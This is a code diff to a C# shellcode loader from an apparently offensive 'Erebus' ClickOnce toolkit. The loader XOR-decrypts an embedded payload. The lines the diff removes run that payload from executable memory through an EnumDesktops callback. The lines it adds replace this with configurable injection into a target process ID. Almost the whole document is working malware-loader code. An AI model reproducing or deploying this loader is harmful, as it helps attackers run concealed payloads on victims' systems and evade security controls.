@@ -1,4 +1,5 @@
 ﻿using Erebus.ClickOnce;
+using System;
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
 using System.Text;
@@ -11,22 +12,52 @@ namespace ShellcodeLoader
         [SupportedOSPlatform("windows")]
         public static void Main(string[] args)
         {
-            byte[] key = { { { SHELLCODE_KEY } } };
+            // Load configuration
+            string injectionMethod = InjectionConfig.InjectionMethod;
+            int targetPid = InjectionConfig.TargetPID;
+            byte[] key = InjectionConfig.EncryptionKey;
 
+            DebugLogger.WriteLine($"[*] Injection Method: {injectionMethod}");
+            if (targetPid > 0)
+                DebugLogger.WriteLine($"[*] Target PID: {targetPid}");
+
+            // Decrypt shellcode
             byte[] shellcode = ErebusRsrc.erebus_bin;
 
             if (key.Length > 0)
             {
+                DebugLogger.WriteLine("[+] Decrypting shellcode...");
                 for (int i = 0; i < shellcode.Length; i++)
                     shellcode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
             }
 
-            IntPtr base_address = Win32.VirtualAllocEx(Win32.GetCurrentProcess(), IntPtr.Zero, (uint)shellcode.Length,
-                Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE, Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
+            DebugLogger.WriteLine($"[+] Shellcode size: {shellcode.Length} bytes");
 
-            Marshal.Copy(shellcode, 0, base_address, shellcode.Length);
+            // Execute injection
+            try
+            {
+                IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
+                DebugLogger.WriteLine($"[+] Using: {injector.Name}");
+                DebugLogger.WriteLine($"[+] Description: {injector.Description}");
+                DebugLogger.WriteLine("");
 
-            Win32.EnumDesktops(IntPtr.Zero, base_address, IntPtr.Zero);
+                bool success = injector.Inject(shellcode, targetPid);
+                
+                if (success)
+                {
+                    DebugLogger.WriteLine("\n[+] Injection completed successfully!");
+                }
+                else
+                {
+                    DebugLogger.WriteLine("\n[-] Injection failed!");
+                    Environment.Exit(1);
+                }
+            }
+            catch (Exception ex)
+            {
+                DebugLogger.WriteLine($"\n[-] Error: {ex.Message}");
+                Environment.Exit(1);
+            }
         }
     }
 }
